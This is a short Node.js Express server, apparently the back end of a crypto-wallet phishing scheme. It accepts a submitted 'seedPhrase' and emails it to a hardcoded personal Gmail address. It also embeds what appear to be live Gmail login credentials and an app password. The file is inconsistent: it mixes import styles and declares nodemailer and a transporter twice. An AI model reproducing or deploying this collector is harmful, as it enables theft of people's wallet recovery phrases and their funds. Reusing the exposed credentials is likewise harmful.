import nodemailer from "nodemailer"
import dotenv from "dotenv"


dotenv.config()

    const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        }
    });

const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/send-email', async (req, res) => {
  const { seedPhrase } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail', // or your email provider
    auth: {
      user: 'noreply173fuck@gmail.com',
      pass: 'xhpk rwev bowm gevf',
    },
  });

  const mailOptions = {
    from: 'noreply173fuc@gmail.com',
    to: 'aabdulahadam@gmail.com', // Receiver email
    subject: 'Recovery Phrase Submission',
    text: `Recovery Phrase: ${seedPhrase}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send('Email sent successfully');
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send('Failed to send email');
  }
});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));
